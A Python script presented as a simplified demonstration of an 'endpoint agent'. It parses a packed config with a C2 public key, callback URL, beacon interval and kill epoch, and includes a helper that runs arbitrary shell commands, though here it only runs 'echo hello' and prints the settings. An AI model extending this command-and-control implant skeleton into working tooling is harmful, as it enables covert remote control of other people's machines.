#!/usr/bin/env python3
"""
Simplified Python endpoint agent for demonstration.
Shows working structure without complex encryption.
"""

import json
import subprocess
import time
import sys
import os
import base64
from typing import Dict, Any, Optional

from config_manager import unpack_config
from crypto_utils import decode_key_b64


def execute_command(command: str) -> str:
    """Execute shell command and return output."""
    try:
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=30
        )
        
        output = result.stdout
        if result.stderr:
            output += f"\nSTDERR: {result.stderr}"
        if result.returncode != 0:
            output += f"\nReturn code: {result.returncode}"
            
        return output.strip()
    except subprocess.TimeoutExpired:
        return "Command timed out after 30 seconds"
    except Exception as e:
        return f"Command execution failed: {str(e)}"


def run_simple_agent(config_data: bytes) -> None:
    """Main agent execution loop with simplified communication."""
    try:
        # Unpack configuration
        agent_pub_key, agent_priv_key, config = unpack_config(config_data)
        
        deploy_id = config["deploy_id"]
        interval = int(config["interval"]) / 1000.0  # Convert ms to seconds
        callback_url = config["callback"]
        kill_epoch = int(config["kill_epoch"])
        
        print(f"Simple Agent started - Deploy ID: {deploy_id}")
        print(f"Callback URL: {callback_url}")
        print(f"Interval: {interval}s")
        print(f"Kill epoch: {kill_epoch}")
        
        # For demonstration, execute the test command directly
        test_command = "echo hello"
        print(f"\nExecuting test command: {test_command}")
        result = execute_command(test_command)
        print(f"Command result: {result}")
        
        # Demonstrate configuration parsing
        print(f"\nConfiguration details:")
        print(f"- Build ID: {config['build_id']}")
        print(f"- Deploy ID: {config['deploy_id']}")
        print(f"- Callback: {config['callback']}")
        print(f"- C2 public key: {config['c2_pub_key'][:20]}...")
        print(f"- Agent private key: {config['agent_priv_key'][:20]}...")
        
        print("\n✅ Simple agent demonstration completed successfully!")
        
    except Exception as e:
        print(f"❌ Agent execution failed: {e}")
        raise


def main() -> None:
    """Main entry point for simple agent demonstration."""
    if len(sys.argv) != 2:
        print("Usage: python simple_agent.py <config_file>")
        sys.exit(1)
    
    config_file = sys.argv[1]
    
    try:
        with open(config_file, 'rb') as f:
            config_data = f.read()
        
        if len(config_data) != 528:
            print(f"Error: Config file must be exactly 528 bytes, got {len(config_data)}")
            sys.exit(1)
        
        run_simple_agent(config_data)
        
    except FileNotFoundError:
        print(f"Error: Config file '{config_file}' not found")
        sys.exit(1)
    except Exception as e:
        print(f"Error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()